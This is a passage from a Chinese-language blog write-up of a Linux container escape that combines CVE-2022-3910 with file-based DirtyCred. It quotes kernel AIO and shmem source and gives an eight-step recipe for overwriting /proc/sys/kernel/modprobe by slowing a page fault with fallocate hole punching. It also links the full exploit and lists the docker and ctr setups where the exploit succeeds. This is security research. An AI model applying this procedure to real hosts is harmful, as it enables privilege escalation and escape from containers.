的前身。我们可以尝试利用其中的<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/aio.c#L1568"><code>aio_write()</code></a>函数，如果我们通过内核 AIO 接口请求写入系统调用，该函数就会被调用：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">aio_write</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kiocb *req, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> iocb *iocb,</span><br><span class="hljs-params">			 <span class="hljs-type">bool</span> vectored, <span class="hljs-type">bool</span> compat)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">inline_vecs</span>[<span class="hljs-title">UIO_FASTIOV</span>], *<span class="hljs-title">iovec</span> =</span> inline_vecs;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iov_iter</span> <span class="hljs-title">iter</span>;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br>	<span class="hljs-type">int</span> ret;<br><br>	ret = aio_prep_rw(req, iocb);<br>	<span class="hljs-keyword">if</span> (ret)<br>		<span class="hljs-keyword">return</span> ret;<br>	file = req-&gt;ki_filp;<br><br>	<span class="hljs-keyword">if</span> (unlikely(!(file-&gt;f_mode &amp; FMODE_WRITE)))<br>		<span class="hljs-keyword">return</span> -EBADF;<br>	<span class="hljs-keyword">if</span> (unlikely(!file-&gt;f_op-&gt;write_iter))<br>		<span class="hljs-keyword">return</span> -EINVAL;<br><br>	ret = aio_setup_rw(WRITE, iocb, &amp;iovec, vectored, compat, &amp;iter);<br>	<span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>)<br>		<span class="hljs-keyword">return</span> ret;<br>	ret = rw_verify_area(WRITE, file, &amp;req-&gt;ki_pos, iov_iter_count(&amp;iter));<br>	<span class="hljs-keyword">if</span> (!ret) &#123;<br>		<span class="hljs-comment">/*</span><br><span class="hljs-comment">		 * Open-code file_start_write here to grab freeze protection,</span><br><span class="hljs-comment">		 * which will be released by another thread in</span><br><span class="hljs-comment">		 * aio_complete_rw().  Fool lockdep by telling it the lock got</span><br><span class="hljs-comment">		 * released so that it doesn&#x27;t complain about the held lock when</span><br><span class="hljs-comment">		 * we return to userspace.</span><br><span class="hljs-comment">		 */</span><br>		<span class="hljs-keyword">if</span> (S_ISREG(file_inode(file)-&gt;i_mode)) &#123;<br>			sb_start_write(file_inode(file)-&gt;i_sb);<br>			__sb_writers_release(file_inode(file)-&gt;i_sb, SB_FREEZE_WRITE);<br>		&#125;<br>		req-&gt;ki_flags |= IOCB_WRITE;<br>		aio_rw_done(req, call_write_iter(file, req, &amp;iter));<br>	&#125;<br>	kfree(iovec);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>aio_setup_rw()</code>会使用<code>copy_from_user()</code>从用户态复制<code>iovec</code>，同时它位于我们的竞争窗口内（在权限检查之后，但在写入程序处理完成之前）。因此，如果我们有权访问<a target="_blank" rel="noopener" href="https://blog.lizzie.io/using-userfaultfd.html">userfaultfd</a>或<a target="_blank" rel="noopener" href="https://exploiter.dev/blog/2022/FUSE-exploit.html">FUSE</a>，我们就可以稳定的利用这个竞争窗口，从而允许我们将写入操作重定向到<code>/proc/sys/kernel/modprobe</code>.</p><p>但是一般来说，不太会有人<strong>在容器​内</strong>启用 FUSE 或为 userfaultfd 打开内核页错误处理。所以看上去利用上述技术所需的条件过于严格，无法在一般的现实世界利用场景中发挥作用。</p><blockquote><p>注意：从技术角度来说，即使 userfaultfd 内核页错误处理被禁用，如果我们有<code>CAP_SYS_PTRACE</code>能力，我们仍然可以使用它完成利用（实际检查在<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/userfaultfd.c#L2064">这里</a>）。当然，一般来说，即使拥有容器root的权限，我们也不太可能获取这个能力…….</p></blockquote><h2 id="slow-page-fault">Slow page fault</h2><p>让我们回过头考虑一下到目前为止 userfaultfd 和 FUSE 在我们的漏洞利用过程中所扮演的角色。当内核尝试从用户空间复制数据并遇到页错误时：</p><ul><li>userfaultfd 会导致出错的内核线程暂停，直到我们处理来自用户态的页错误。</li><li>当内核尝试将错误页加载到内存中时，将调用我们自定义的 FUSE 读取处理程序。</li></ul><p>在这两种情况下，我们都可以简单地在<code>copy_from_user()</code>调用处暂停内核线程直到完成其他事情，例如制造对碰。但是是否有可能使页错误花费很长时间，以便我们可以在该时间窗口内完成堆喷？</p><p>gctf 2023中提出了<a target="_blank" rel="noopener" href="https://gist.github.com/pqlx/b1ed41e7557c042bcc7a8c74ea1feae8">利用文件打洞 (Hole Punching)</a>来显着增加页错误造成的延迟：</p><p><img lazyload src="/img/loading.gif" data-src="https://starlabs.sg/blog/2023/images/07-container-escape-using-file-based-DirtyCred_003.png"></p><p><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.0-rc5/source/mm/shmem.c#L2061"><code>shmem_fault()</code></a>中的注释解释了为什么会出现这种情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Trinity finds that probing a hole which tmpfs is punching can</span><br><span class="hljs-comment"> * prevent the hole-punch from ever completing: which in turn</span><br><span class="hljs-comment"> * locks writers out with its hold on i_rwsem.  So refrain from</span><br><span class="hljs-comment"> * faulting pages into the hole while it&#x27;s being punched.  Although</span><br><span class="hljs-comment"> * shmem_undo_range() does remove the additions, it may be unable to</span><br><span class="hljs-comment"> * keep up, as each new page needs its own unmap_mapping_range() call,</span><br><span class="hljs-comment"> * and the i_mmap tree grows ever slower to scan if new vmas are added.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * It does not matter if we sometimes reach this check just before the</span><br><span class="hljs-comment"> * hole-punch begins, so that one fault then races with the punch:</span><br><span class="hljs-comment"> * we just need to make racing faults a rare case.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * The implementation below would be much simpler if we just used a</span><br><span class="hljs-comment"> * standard mutex or completion: but we cannot take i_rwsem in fault,</span><br><span class="hljs-comment"> * and bloating every shmem inode for this unlikely case would be sad.</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h2 id="最终利用">最终利用</h2><p>结合上述两个技巧，我们可以得出最终的利用方式：</p><ol type="1"><li><p>先随便打开一些文件，比如文件 A，设置权限为<code>O_RDWR</code>。内核会分配一个相应的<code>file</code>结构体。</p></li><li><p>利用CVE-2022-3910反复减少文件A结构体的引用计数，​<strong>直到其下溢</strong>​。这会free结构体但在文件描述符表中仍然保留对它的引用。</p><blockquote><p><strong>注意</strong>：这是必需的，因为<code>fget()</code>（稍后我们提交 AIO 请求时将调用它）如果在引用计数为 0 的<code>file</code>结构体上调用将导致内核停止。代码在<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.0-rc5/source/fs/file.c#L882">这里</a>（检查的宏是<code>get_file_rcu</code>）。</p></blockquote></li><li><p>使用<code>memfd_create()</code>创建并获取临时文件 B 的文件描述符，并使用<code>fallocate()</code>为其分配大量内存。</p></li><li><p>使用跨页的缓冲区准备 AIO 请求。第二块页应该由文件 B 控制，并且尚未加载在内存中。</p></li><li><p>（CPU 1，线程X）：使用<code>FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE</code>调用<code>fallocate()</code>加载文件 B。</p></li><li><p>（CPU 1，线程Y）：提交AIO请求。这会触发文件 B 所在页的页错误。当文件正在打洞时，线程 Y 会将<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.0-rc5/source/mm/shmem.c#L2086">自己放入等待队列</a>，停止执行，直到线程 X 完成。</p></li><li><p>（CPU 0，线程 Z）：当线程 Y 停止时，重复调用<code>open()</code>打开<code>/proc/sys/kernel/modprobe</code>来让对应的<code>file</code>结构体覆盖掉文件A的结构体。</p></li><li><p>线程 Y 恢复执行并在<code>/proc/sys/kernel/modprobe</code>上执行写入。</p></li></ol><p>完整的exp如下: <a target="_blank" rel="noopener" href="https://starlabs.sg/blog/2023/07-container-escape-using-file-based-DirtyCred_source.zip">container-escape-using-file-based-DirtyCred.rar</a></p><h1 id="实际利用">实际利用</h1><h2 id="标准-docker-容器">标准 Docker 容器</h2><p>Command：<code>sudo docker run -it --rm ubuntu bash</code></p><p>但是实际上我们的exp并没有起作用，相反，会收到<code>Permission denied</code>。因为在调用<code>aio_setup_rw()</code>后，<code>rw_verify_area()</code>会调用安全钩子函数。默认情况下，Docker 容器在受限的 AppArmor 配置文件下运行，因此额外的权限检查<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.0-rc5/source/security/apparmor/file.c#L598"><code>aa_file_perm()</code></a>失败，导致<code>aio_write()</code>返回而未实际执行写入操作。😥</p><h3 id="docker-with-apparmorunconfined">Docker with <code>apparmor=unconfined</code></h3><p>Command：<code>sudo docker run -it --rm --security-opt apparmor=unconfined ubuntu bash</code></p><p>然而，如果 Docker 容器使用<code>apparmor=unconfined</code>运行，那么<code>aa_file_perm()</code>会在实际权限检查发生之前提前退出，从而使我们的漏洞利用能够顺利进行。</p><p>这种情况并不是非常有用，因为不太可能有人会特意在已部署的 Docker 容器上禁用 AppArmor。</p><h2 id="更实际的场景">更实际的场景</h2><p>Command：<code>sudo ctr run -t --rm docker.io/library/ubuntu:latest bash</code></p><p>如果我们使用直接在 containerd 的 API 之上运行的<code>ctr</code>命令行客户端来启动容器，那么该漏洞利用程序也可以正常工作。这是该技术的一个更现实的利用。🙂</p><h1 id="references">References</h1><ul><li>io_uring<ul><li><a target="_blank" rel="noopener" href="https://kernel-recipes.org/en/2022/wp-content/uploads/2022/06/axboe-kr2022-1.pdf">https://kernel-recipes.org/en/2022/wp-content/uploads/2022/06/axboe-kr2022-1.pdf</a></li><li><a target="_blank" rel="noopener" href="https://lwn.net/Articles/863071/">https://lwn.net/Articles/863071/</a></li><li><a target="_blank" rel="noopener" href="https://github.com/axboe/liburing/wiki/io_uring-and-networking-in-2023#ring-messages">https://github.com/axboe/liburing/wiki/io_uring-and-networking-in-2023#ring-messages</a></li></ul></li><li>DirtyCred<ul><li><a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf">https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf</a></li><li><a target="_blank" rel="noopener" href="https://blog.hacktivesecurity.com/index.php/2022/12/21/cve-2022-2602-dirtycred-file-exploitation-applied-on-an-io_uring-uaf/">https://blog.hacktivesecurity.com/index.php/2022/12/21/cve-2022-2602-dirtycred-file-exploitation-applied-on-an-io_uring-uaf/</a></li><li><a target="_blank" rel="noopener" href="https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique">https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique</a></li></ul></li><li><code>/proc</code> filesystem<ul><li><a target="_blank" rel="noopener" href="https://docs.kernel.org/filesystems/proc.html">https://docs.kernel.org/filesystems/proc.html</a></li></ul></li><li>Kernel AIO<ul><li><a target="_blank" rel="noopener" href="https://blog.cloudflare.com/io_submit-the-epoll-alternative-youve-never-heard-about/">https://blog.cloudflare.com/io_submit-the-epoll-alternative-youve-never-heard-about/</a></li></ul></li><li>fallocate() slow page<ul><li><a target="_blank" rel="noopener" href="https://gist.github.com/pqlx/b1ed41e7557c042bcc7a8c74ea1feae8">https://gist.github.com/pqlx/b1ed41e7557c042bcc7a8c74ea1feae8</a></li></ul></li></ul></div><hr><div><div class="post-metas my-3"><div class="post-meta mr-3 d-flex align-items-center"><i class="iconfont icon-category"></i> <span class="category-chains"><span class="category-chain"><a href="/categories/Security-Research/" class="category-chain-item">Security Research</a></span></span></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a href="/tags/System-Security/" class="print-no-link">#System Security</a> <a href="/tags/linux/" class="print-no-link">#linux</a> <a href="/tags/DirtyCred/" class="print-no-link">#DirtyCred</a> <a href="/tags/Kernel/" class="print-no-link">#Kernel</a> <a href="/tags/CVE/" class="print-no-link">#CVE</a> <a href="/tags/Container-Escape/" class="print-no-link">#Container Escape</a></div></div><div class="license-box my-3"><div class="license-title"><div>CVE-2022-3901：利用DirtyCred进行容器逃逸</div><div>https://mundi-xu.github.io/2023/08/03/CVE-2022-3901-Container-Escape-via-File-based-DirtyCred/</div></div><div class="license-meta"><div class="license-meta-item"><div>Author</div><div>煊宇</div></div><div class="license-meta-item license-meta-date"><div>Posted on</div><div>August 3, 2023</div></div><div class="license-meta-item"><div>Licensed under</div><div><a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/" rel="external nofollow noreferrer"><span class="hint--top hint--rounded" aria-label="BY - Attribution"><i class="iconfont icon-cc-by"></i> </span></a><a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/" rel="external nofollow noreferrer"><span class="hint--top hint--rounded" aria-label="NC - Non-commercial"><i class="iconfont icon-cc-nc"></i></span></a></div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href="/2024/03/25/IELTS/" title="雅思学习笔记"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">雅思学习笔记</span> <span class="visible-mobile">Previous</span></a></article><article class="post-next col-6"><a href="/2023/07/26/Security-Risk-Analysis-of-Huawei-Mindspore/" title="MindSpore风险剖析与测试指南"><span class="hidden-mobile">MindSpore风险剖析与测试指南</span> <span class="visible-mobile">Next</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article id="comments"><div id="giscus" class="giscus"></div><script type="text/javascript">Fluid.utils.loadComments('#giscus', function() {
        var options = {"repo":"Mundi-Xu/mundi-xu.github.io","repo-id":"MDEwOlJlcG9zaXRvcnkxNTQ1OTg4Mjg=","category":"Announcements","category-id":"DIC_kwDOCTb9rM4CeUGi","theme-light":"light","theme-dark":"dark","mapping":"title","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN","strict":0};
        var attributes = {};
        for (let option in options) {
          if (!option.startsWith('theme-')) {
            var key = option.startsWith('data-') ? option : 'data-' + option;
            attributes[key] = options[option];
          }
        }
        var light = 'light';
        var dark = 'dark';
        window.GiscusThemeLight = light;
        window.GiscusThemeDark = dark;
        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
        for (let attribute in attributes) {
          var value = attributes[attribute];
          if (value === undefined || value === null || value === '') {
            delete attributes[attribute];
          }
        }
        var s = document.createElement('script');
        s.setAttribute('src', 'https://giscus.app/client.js');
        s.setAttribute('crossorigin', 'anonymous');
        for (let attribute in attributes) {
          s.setAttribute(attribute, attributes[attribute]);
        }
        var ss = document.getElementsByTagName('script');
        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
        e.parentNode.insertBefore(s, e.nextSibling);
      });</script><noscript>Please enable JavaScript to view the comments</noscript></article></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar" style="margin-left:-1rem"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i> <span>Table of Contents</span></p><div class="toc-body" id="toc-body"></div></div></aside></div></div></div><a id="scroll-top-button" aria-label="TOP" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">Search</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">Keyword</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer><div class="footer-inner"><div class="footer-content"><a href="mailto:mundi.xu@gmail.com?subject=Interested+In+Your+Blog" rel="external nofollow noreferrer" target="_blank"><span>Contact me</span></a> <i class="iconfont icon-love"></i> <a href="mailto:mundi.xu@gmail.com?subject=Interested+In+Your+Blog" rel="external nofollow noreferrer" target="_blank"><span>mundi.xu@gmail.com</span></a></div><div class="statistics"><span id="busuanzi_container_site_pv" style="display:none">Views: <span id="busuanzi_value_site_pv"></span> </span><span id="busuanzi_container_site_uv" style="display:none">Visitors: <span id="busuanzi_value_site_uv"></span></span></div></div></footer><script src="https://cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",function(){NProgress.done()})</script><script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/js/bootstrap.min.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/typed.js/2.1.0/typed.umd.js"></script><script>!function(t){var e=Fluid.plugins.typing,i=t.getElementById("subtitle");i&&e&&e(i.getAttribute("data-typed-text"))}((window,document))</script><script src="/js/img-lazyload.js"></script><script>var relativeDate=function(){var t,e,a,d,i=document.getElementById("updated-time");i&&(e=/\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/,(a=(t=i.textContent).match(e))&&(d=dayjs(a[0]).fromNow(),i.textContent=t.replace(e,d)),i.style.display="")};Fluid.utils.createScript("https://cdnjs.cloudflare.com/ajax/libs/dayjs/1.11.13/dayjs.min.js",function(){Fluid.utils.createScript("https://cdnjs.cloudflare.com/ajax/libs/dayjs/1.11.13/plugin/relativeTime.min.js",function(){dayjs.extend(dayjs_plugin_relativeTime),"en".startsWith("en")?relativeDate():Fluid.utils.createScript("https://cdnjs.cloudflare.com/ajax/libs/dayjs/1.11.13/locale/en.min.js",function(){dayjs.locale("en"),relativeDate()})})})</script><script>Fluid.utils.createScript("https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.36.4/tocbot.min.js",function(){var t,o=jQuery("#toc");0!==o.length&&window.tocbot&&(t=jQuery("#board-ctn").offset().top,window.tocbot.init(Object.assign({tocSelector:"#toc-body",contentSelector:".markdown-body",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",scrollSmooth:!0,includeTitleTags:!0,headingsOffset:-t},CONFIG.toc)),0<o.find(".toc-list-item").length&&o.css("visibility","visible"),Fluid.events.registerRefreshCallback(function(){if("tocbot"in window){tocbot.refresh();var t=jQuery("#toc");if(0===t.length||!tocbot)return;0<t.find(".toc-list-item").length&&t.css("visibility","visible")}}))})</script><script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.11/clipboard.min.js"></script><script>Fluid.plugins.codeWidget()</script><script>Fluid.utils.createScript('https://cdnjs.cloudflare.com/ajax/libs/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });</script><script>Fluid.utils.createScript("https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js",function(){Fluid.plugins.fancyBox()})</script><script>Fluid.plugins.imageCaption()</script><script src="/js/local-search.js"></script><script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/DynamicLine.js"></script><script src="/js/boot.js"></script><noscript><div class="noscript-warning">Blog works best with JavaScript enabled</div></noscript></body></html>